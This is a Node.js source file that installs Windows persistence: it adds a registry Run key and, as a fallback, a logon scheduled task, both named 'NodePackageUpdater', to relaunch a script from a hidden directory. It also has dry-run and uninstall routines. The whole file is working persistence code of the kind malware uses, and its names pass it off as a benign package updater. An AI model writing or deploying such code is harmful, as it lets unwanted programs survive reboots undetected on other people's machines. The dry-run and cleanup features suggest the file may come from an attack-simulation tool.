const { execSync } = require("child_process");
const path = require("path");
const logger = require("../utils/logger");

const RUN_KEY = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const TASK_NAME = "NodePackageUpdater";
const VAL_NAME = "NodePackageUpdater";

function install(hiddenDir, dryRun = false) {
    const results = [];

    if (dryRun) {
        results.push({ operation: "PERSIST_REGISTRY", status: "Skipped — dry-run mode" });
        results.push({ operation: "PERSIST_TASK", status: "Skipped — dry-run mode" });
        return results;
    }

    const nodePath = process.execPath;
    const scriptPath = path.join(hiddenDir, "src", "index.js");
    const cmdValue = `"${nodePath}" "${scriptPath}"`;

    try {
        execSync(
            `reg add "${RUN_KEY}" /v "${VAL_NAME}" /t REG_SZ /d "${cmdValue}" /f`,
            { timeout: 5000, stdio: "pipe" }
        );
        logger.info("Registry Run key installed");
        results.push({ operation: "PERSIST_REGISTRY", status: "OK" });
        return results;
    } catch (err) {
        logger.warn(`Registry persistence failed: ${err.message}`);
        results.push({ operation: "PERSIST_REGISTRY", status: "FAILED", error: err.message });
    }

    try {
        execSync(
            `schtasks /create /tn "${TASK_NAME}" /tr "${cmdValue}" /sc onlogon /f`,
            { timeout: 5000, stdio: "pipe" }
        );
        logger.info("Scheduled task installed as fallback");
        results.push({ operation: "PERSIST_TASK", status: "OK" });
    } catch (err) {
        logger.warn(`Scheduled task fallback also failed: ${err.message}`);
        results.push({ operation: "PERSIST_TASK", status: "FAILED", error: err.message });
    }

    return results;
}

function uninstall(dryRun = false) {
    const results = [];

    if (dryRun) {
        results.push({ operation: "CLEANUP_REGISTRY", status: "Skipped — dry-run mode" });
        results.push({ operation: "CLEANUP_TASK", status: "Skipped — dry-run mode" });
        return results;
    }

    try {
        execSync(
            `reg delete "${RUN_KEY}" /v "${VAL_NAME}" /f 2>nul`,
            { timeout: 5000, stdio: "pipe" }
        );
        logger.info("Registry Run key removed");
        results.push({ operation: "CLEANUP_REGISTRY", status: "OK" });
    } catch {
        results.push({ operation: "CLEANUP_REGISTRY", status: "OK (not found)" });
    }

    try {
        execSync(
            `schtasks /delete /tn "${TASK_NAME}" /f 2>nul`,
            { timeout: 5000, stdio: "pipe" }
        );
        logger.info("Scheduled task removed");
        results.push({ operation: "CLEANUP_TASK", status: "OK" });
    } catch {
        results.push({ operation: "CLEANUP_TASK", status: "OK (not found)" });
    }

    return results;
}

module.exports = { install, uninstall };
